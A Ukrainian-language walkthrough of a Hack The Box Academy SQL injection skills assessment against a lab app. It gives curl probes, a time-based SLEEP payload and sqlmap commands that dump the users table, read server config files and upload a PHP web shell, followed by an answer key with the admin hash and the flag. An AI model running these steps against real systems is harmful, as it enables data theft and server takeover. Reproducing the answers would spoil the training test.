# SQL Injection — Skills Assessment (chattr GmbH)

## Модуль
[SQL Injection Fundamentals — Skills Assessment](https://academy.hackthebox.com/app/module/33/section/518)

## Концепція

Black-box SQLi assessment на HTTPS застосунку. Injection знайдена не на
login формі, а на `/api/checkUsername.php` через Time-Based Blind SQLi.
Повний ланцюг: розвідка → injection → dump DB → web root → OS shell → flag.

---

## Повний плейбук

### Крок 1 — Розвідка застосунку (там потрібно добре поїбатись, щоб воно спрацювало)

```bash
# Структура застосунку
curl -sk https://TARGET:PORT/ | grep -i "href\|action"
# → /register.php, /login.php, /warez (protected)

# Форма реєстрації має invitationCode
curl -sk https://TARGET:PORT/static/js/register.js
# → validateInvitationCode: формат AAAA-AAAA-NNNN
# → /api/checkUsername.php — перевірка username через POST

# API endpoints:
# POST /api/login.php       → form-urlencoded
# POST /api/register.php    → form-urlencoded
# POST /api/checkUsername.php → form-urlencoded
```

### Крок 2 — Виявлення SQLi точки

```bash
# checkUsername: 302=існує, 404=не існує
curl -sk -X POST https://TARGET:PORT/api/checkUsername.php \
  -d "username=admin" -o /dev/null -w "%{http_code}\n"
# → 302

curl -sk -X POST https://TARGET:PORT/api/checkUsername.php \
  -d "username=nonexistent" -o /dev/null -w "%{http_code}\n"
# → 404

# Time-based blind перевірка
curl -sk -X POST https://TARGET:PORT/api/checkUsername.php \
  --data-urlencode "username=admin' AND SLEEP(5)-- -" \
  -w "\nTime: %{time_total}s\n"
# → затримка 5 сек = TIME-BASED BLIND SQLi підтверджено
```

### Крок 3 — sqlmap Time-Based Blind

```bash
sqlmap -u "https://TARGET:PORT/api/checkUsername.php" \
  --data="username=admin" \
  --header="Content-Type: application/x-www-form-urlencoded" \
  --dbms=mysql --batch --level=5 --risk=3 \
  --technique=T \
  -p username \
  --threads=5 \
  --dbs
# → знайдено БД: chattr
```

### Крок 4 — Dump таблиці Users

```bash
sqlmap -u "https://TARGET:PORT/api/checkUsername.php" \
  --data="username=admin" \
  --header="Content-Type: application/x-www-form-urlencoded" \
  --dbms=mysql --batch --level=5 --risk=3 \
  --technique=T \
  -p username \
  -D chattr -T Users --dump
```
Username: admin
Password: $argon2i$v=19$m=2048,t=4,p=3$...(argon2 hash)
InvitationCode: JKTN-OIΥΡ-7672
AccountCreated: 2026-06-08 15:21:53

**Q1 — Password hash for 'admin':**
`$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`

### Крок 5 — Знайти web root

```bash
# Читання nginx конфігу через sqlmap file-read
sqlmap ... --file-read=/etc/nginx/sites-enabled/default
# → root /var/www/chattr-prod
```

**Q2 — Root path:** `/var/www/chattr-prod`

### Крок 6 — OS Shell через sqlmap

```bash
sqlmap -u "https://TARGET:PORT/api/checkUsername.php" \
  --data="username=admin" \
  --header="Content-Type: application/x-www-form-urlencoded" \
  --dbms=mysql --batch --level=5 --risk=3 \
  --technique=T \
  -p username \
  --os-shell
# → вибрати PHP (4)
# → custom location: /var/www/chattr-prod
# → shell завантажено на /var/www/chattr-prod/tmpXXXXX.php
```

### Крок 7 — Читання флагу

```bash
os-shell> ls -la /
# → flag_876a4c.txt

os-shell> cat /flag*
# → 061blaeb94dec6bf5d9c27032b3c1d8d
```

**Q3 — Flag:** `061blaeb94dec6bf5d9c27032b3c1d8d`

---

## Відповіді

| Q | Питання | Відповідь |
|---|---------|-----------|
| Q1 | Password hash for 'admin' | `$argon2i$v=19$m=2048,...HTgvU` |
| Q2 | Root path of web application | `/var/www/chattr-prod` |
| Q3 | Flag from /flag_XXXXXX.txt | `061blaeb94dec6bf5d9c27032b3c1d8d` |

---

## Ключові уроки

| # | Що важливо |
|---|-----------|
| 1 | Injection не завжди на login — перевіряй **всі** API endpoints |
| 2 | `checkUsername` — boolean/time oracle через 302/404 відповіді |
| 3 | login через JSON дає 200 але без Set-Cookie — це red herring |
| 4 | Web root з nginx конфігу → `--file-read=/etc/nginx/sites-enabled/default` |
| 5 | `--os-shell` потребує правильного web root і writable директорії |
| 6 | Argon2 hash — не MD5/bcrypt, сучасний алгоритм — не крекається легко |

## sqlmap корисні опції для цього типу

```bash
# Time-based blind тільки
--technique=T

# Читання файлів
--file-read=/etc/nginx/sites-enabled/default
--file-read=/var/www/chattr-prod/config.php

# OS Shell
--os-shell
# → PHP (4) → custom location → /var/www/chattr-prod

# Dump конкретної таблиці
-D chattr -T Users --dump
```
